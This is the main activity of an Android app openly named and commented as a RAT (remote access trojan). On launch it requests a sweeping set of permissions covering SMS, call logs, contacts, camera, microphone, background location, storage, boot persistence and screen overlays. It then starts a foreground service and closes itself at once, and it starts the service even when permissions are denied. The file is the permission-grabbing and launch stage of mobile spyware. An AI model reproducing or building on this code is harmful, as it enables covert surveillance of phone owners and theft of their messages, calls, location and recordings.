package com.fly0rakoon.rat;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.fly0rakoon.rat.services.ForegroundService;

public class MainActivity extends AppCompatActivity {
    
    private static final int PERMISSION_REQUEST_CODE = 100;
    
    // All permissions needed for the RAT
    private static final String[] REQUIRED_PERMISSIONS = {
    Manifest.permission.INTERNET,
    Manifest.permission.ACCESS_NETWORK_STATE,
    Manifest.permission.ACCESS_WIFI_STATE,
    
    // Storage permissions - conditional on Android version
    // For Android 13+ (API 33+)
    Manifest.permission.READ_MEDIA_IMAGES,
    Manifest.permission.READ_MEDIA_VIDEO,
    
    // For older Android versions (API 32 and below)
    Manifest.permission.READ_EXTERNAL_STORAGE,
    Manifest.permission.WRITE_EXTERNAL_STORAGE,
    
    // Location permissions
    Manifest.permission.ACCESS_FINE_LOCATION,
    Manifest.permission.ACCESS_COARSE_LOCATION,
    Manifest.permission.ACCESS_BACKGROUND_LOCATION,
    
    // Camera and microphone
    Manifest.permission.CAMERA,
    Manifest.permission.RECORD_AUDIO,
    
    // Contacts
    Manifest.permission.READ_CONTACTS,
    Manifest.permission.WRITE_CONTACTS,
    
    // SMS
    Manifest.permission.READ_SMS,
    Manifest.permission.SEND_SMS,
    Manifest.permission.RECEIVE_SMS,
    
    // Phone and call logs
    Manifest.permission.READ_CALL_LOG,
    Manifest.permission.WRITE_CALL_LOG,
    Manifest.permission.READ_PHONE_STATE,
    Manifest.permission.CALL_PHONE,
    Manifest.permission.PROCESS_OUTGOING_CALLS,
    
    // System permissions
    Manifest.permission.FOREGROUND_SERVICE,
    Manifest.permission.POST_NOTIFICATIONS,
    Manifest.permission.RECEIVE_BOOT_COMPLETED,
    Manifest.permission.WAKE_LOCK,
    Manifest.permission.SYSTEM_ALERT_WINDOW,
    Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
};
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Check and request permissions
        if (hasAllPermissions()) {
            startServiceAndFinish();
        } else {
            requestPermissions();
        }
    }
    
    private boolean hasAllPermissions() {
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) 
                    != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }
    
    private void requestPermissions() {
        ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, PERMISSION_REQUEST_CODE);
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted) {
                Toast.makeText(this, "All permissions granted", Toast.LENGTH_SHORT).show();
                startServiceAndFinish();
            } else {
                Toast.makeText(this, "Some permissions were denied. App may not function correctly.", Toast.LENGTH_LONG).show();
                // Still start service with whatever permissions we have
                startServiceAndFinish();
            }
        }
    }
    
    private void startServiceAndFinish() {
        // Start the foreground service
        Intent serviceIntent = new Intent(this, ForegroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        
        // Finish activity immediately
        finish();
    }
}
